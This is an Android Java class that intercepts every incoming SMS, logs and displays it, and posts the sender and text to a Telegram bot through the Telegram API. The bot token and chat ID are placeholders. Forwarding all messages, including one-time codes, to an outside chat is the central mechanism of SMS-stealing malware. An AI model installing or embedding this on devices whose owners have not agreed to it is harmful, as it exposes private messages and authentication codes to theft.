package com.example.nativesmsattempt2.ui;

import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.provider.Telephony;
import android.telephony.SmsMessage;
import android.util.Log;

import androidx.core.app.NotificationCompat;
import androidx.core.app.NotificationManagerCompat;
import androidx.localbroadcastmanager.content.LocalBroadcastManager;

import com.example.nativesmsattempt2.R;
import com.example.nativesmsattempt2.ui.SmsConstants;

import android.util.Log; // For logging

import java.net.HttpURLConnection; // For making HTTP connections
import java.net.URL; // For creating URLs
import java.util.concurrent.atomic.AtomicInteger;

public class SmsReceiver extends BroadcastReceiver {

    private static final String CHANNEL_ID = "sms_channel";
    private static final int NOTIFICATION_ID = 1;
    private static final AtomicInteger notificationIdCounter = new AtomicInteger(0);

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals(Telephony.Sms.Intents.SMS_RECEIVED_ACTION)) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                if (pdus != null) {
                    for (Object pdu : pdus) {
                        SmsMessage smsMessage = getIncomingMessage((byte[]) pdu, bundle);
                        String sender = smsMessage.getDisplayOriginatingAddress();
                        String messageBody = smsMessage.getDisplayMessageBody();

                        Log.d("SmsReceiver", "Sender: " + sender + ", Message: " + messageBody);

                        // Send the SMS data to MainActivity using LocalBroadcastManager
                        Intent smsIntent = new Intent(SmsConstants.SMS_RECEIVED_ACTION);
                        smsIntent.putExtra(SmsConstants.SMS_SENDER, sender);
                        smsIntent.putExtra(SmsConstants.SMS_MESSAGE, messageBody);
                        LocalBroadcastManager.getInstance(context).sendBroadcast(smsIntent);

                        // Show notification
                        showNotification(context, sender, messageBody);

                        // Send to Telegram
                        sendToTelegram(sender, messageBody);
                    }
                }
            }
        }
    }

    private SmsMessage getIncomingMessage(byte[] objectPDU, Bundle bundle) {
        SmsMessage currentSMS;
        String format = bundle.getString("format");
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            currentSMS = SmsMessage.createFromPdu(objectPDU, format);
        } else {
            currentSMS = SmsMessage.createFromPdu(objectPDU);
        }
        return currentSMS;
    }

    private void showNotification(Context context, String sender, String message) {
        createNotificationChannel(context);

        // Create an explicit intent for an Activity in your app
        Intent intent = new Intent(context, MainActivity.class);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
        PendingIntent pendingIntent = PendingIntent.getActivity(context, 0, intent, PendingIntent.FLAG_IMMUTABLE);

        NotificationCompat.Builder builder = new NotificationCompat.Builder(context, CHANNEL_ID)
                .setSmallIcon(R.drawable.ic_sms_notification) // Replace with your icon
                .setContentTitle("New SMS from " + sender)
                .setContentText(message)
                .setPriority(NotificationCompat.PRIORITY_HIGH)
                .setContentIntent(pendingIntent)
                .setAutoCancel(true);

        NotificationManagerCompat notificationManager = NotificationManagerCompat.from(context);
        int notificationId = notificationIdCounter.incrementAndGet();
        notificationManager.notify(notificationId, builder.build());
    }

    private void createNotificationChannel(Context context) {
        // Create the NotificationChannel, but only on API 26+ because
        // the NotificationChannel class is new and not in the support library
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            CharSequence name = "SMS Notifications";
            String description = "Channel for SMS notifications";
            int importance = NotificationManager.IMPORTANCE_HIGH;
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, name, importance);
            channel.setDescription(description);
            // Register the channel with the system; you can't change the importance
            // or other notification behaviors after this
            NotificationManager notificationManager = context.getSystemService(NotificationManager.class);
            notificationManager.createNotificationChannel(channel);
        }
    }

    private void sendToTelegram(String sender, String message) {
        new Thread(() -> {
            String botToken = "BOT_TOKEN_HERE"; // Replace with your bot token
            String chatId = "CHAT_ID_HERE"; // Replace with your chat ID
            String apiUrl = "https://api.telegram.org/bot" + botToken + "/sendMessage";

            try {
                URL url = new URL(apiUrl);
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                connection.setRequestMethod("POST");
                connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                connection.setDoOutput(true);

                // Format the message here
                String formattedMessage = "Sender: " + sender + "\nMessage: " + message;
                String postData = "chat_id=" + chatId + "&text=" + java.net.URLEncoder.encode(formattedMessage, "UTF-8");
                connection.getOutputStream().write(postData.getBytes());


                int responseCode = connection.getResponseCode();
                if (responseCode == HttpURLConnection.HTTP_OK) {
                    Log.d("SmsReceiver", "Message sent to Telegram successfully.");
                } else {
                    Log.e("SmsReceiver", "Failed to send message to Telegram. Response code: " + responseCode);
                }
                connection.disconnect();
            } catch (Exception e) {
                Log.e("SmsReceiver", "Error sending message to Telegram: " + e.getMessage());
            }
        }).start();
    }
}

